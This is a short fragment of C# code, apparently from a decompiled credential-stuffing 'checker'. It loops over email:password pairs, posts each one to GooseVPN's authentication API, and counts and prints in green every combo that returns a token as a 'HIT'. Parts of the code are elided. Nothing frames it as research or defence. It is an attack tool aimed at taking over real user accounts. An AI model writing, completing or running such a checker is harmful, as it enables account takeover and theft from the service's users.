        ...
        while (true)
        {
          try
          {
            using (HttpRequest httpRequest = new HttpRequest())
            {
              ...
              if (httpRequest.Post("https://api1.goosevpn.com/auth/email", str, "application/json; charset=UTF-8").ToString().Contains("{\"token"))
              {
                ++mainmenu.hits;
                if (mainmenu.p1 == "2")
                  Colorful.Console.WriteLine("[HIT - GOOSEVPN] " + s[0] + ":" + s[1], Color.Green);
